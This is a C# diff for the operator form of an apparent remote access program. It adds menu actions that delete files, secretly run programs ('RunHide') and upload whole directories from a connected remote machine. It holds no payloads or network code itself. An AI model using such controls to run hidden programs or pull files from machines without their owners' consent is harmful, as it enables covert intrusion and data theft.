@@ -23,10 +23,13 @@ namespace ServerWorker
             InitializeComponent();    
             menu = new ContextMenuStrip(this.components);
             menu.Items.Add("Delete");
+            menu.Items[0].Click += DeleteFile;
             menu.Items.Add("Run");
+            menu.Items[1].Click += Run;
             menu.Items.Add("RunHide");
-            menu.Items.Add("Download");
-            menu.Click += Test;
+            menu.Items[2].Click += RunHide;
+            menu.Items.Add("Upload");
+            menu.Items[3].Click += Upload;
 
             List<string> drivers = user.UsersCom.GetDrives();
             listBox1.Items.Clear();
@@ -46,9 +49,22 @@ namespace ServerWorker
             }
         }
 
-        private void Test(object sender, EventArgs e)
+        private void DeleteFile(object sender, EventArgs e)
         {
-            MessageBox.Show("olololo");
+            user.UsersCom.DeleteFile(listBox1.SelectedItem.ToString());
+            ReRequest();
+        }
+        private void Run(object sender, EventArgs e)
+        {
+            MessageBox.Show("Функця еще не реализована");
+        }
+        private void RunHide(object sender, EventArgs e)
+        {
+            user.UsersCom.RunHideProgram(listBox1.SelectedItem.ToString());
+        }
+        private void Upload(object sender, EventArgs e)
+        {
+            user.UsersCom.UploadDirectory(listBox1.SelectedItem.ToString(), "Upload");
         }
         private void listBox1_KeyPress(object sender, KeyPressEventArgs e)
         {
@@ -66,6 +82,19 @@ namespace ServerWorker
             }
         }
 
+        private void ReRequest()
+        {
+            try
+            {
+                string[] dirs = user.UsersCom.GetDirectoryFiles(currDirectory, "*");
+                listBox1.Items.Clear();
+                listBox1.Items.AddRange(dirs);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
         private void Forward()
         {
             try
